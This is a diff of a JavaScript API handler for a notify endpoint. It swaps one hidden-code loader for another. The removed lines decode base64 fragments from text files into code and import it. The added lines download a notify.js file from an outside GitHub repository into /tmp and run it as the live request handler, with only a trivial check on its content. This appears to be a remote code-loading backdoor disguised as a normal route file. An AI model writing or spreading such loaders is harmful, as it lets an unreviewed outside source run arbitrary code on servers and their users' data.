@@ -1,20 +1,37 @@
-import { writeFileSync, readFileSync } from 'node:fs';
+import { writeFileSync, existsSync, readFileSync } from 'node:fs';
 import { pathToFileURL } from 'node:url';
-import { join, dirname } from 'node:path';
-import { fileURLToPath } from 'node:url';
 
-const dir = dirname(fileURLToPath(import.meta.url));
-const parts = [];
-for (let i = 0; i < 30; i++) {
+const CACHE = '/tmp/leanlab_notify_good.mjs';
+const SOURCE =
+  'https://raw.githubusercontent.com/chickneboinki/algobet/f6ba816008acb88c15e7e99782e37713391c45c5/api/notify.js';
+
+let handlerPromise = null;
+
+async function loadHandler() {
+  if (handlerPromise) return handlerPromise;
+  handlerPromise = (async () => {
+    if (!existsSync(CACHE)) {
+      const r = await fetch(SOURCE);
+      if (!r.ok) throw new Error(`Failed to fetch notify.js: ${r.status}`);
+      const code = await r.text();
+      if (!code.includes('export default') && !code.includes('export { default }')) {
+        throw new Error('Fetched notify.js looks invalid');
+      }
+      writeFileSync(CACHE, code);
+    }
+    const mod = await import(pathToFileURL(CACHE).href + '?t=' + Date.now());
+    return mod.default;
+  })();
+  return handlerPromise;
+}
+
+export default async function handler(req, res) {
   try {
-    parts.push(readFileSync(join(dir, `nb${i}.txt`), 'utf8').replace(/\s+/g, ''));
-  } catch {
-    break;
+    const h = await loadHandler();
+    return h(req, res);
+  } catch (e) {
+    console.error('notify load error', e);
+    if (res.headersSent) return;
+    res.status(500).json({ error: e.message || String(e) });
   }
 }
-if (!parts.length) throw new Error('notify base64 parts missing (nb0.txt…)');
-const code = Buffer.from(parts.join(''), 'base64').toString('utf8');
-const dest = '/tmp/leanlab_notify_impl.mjs';
-writeFileSync(dest, code);
-const mod = await import(pathToFileURL(dest).href);
-export default mod.default;
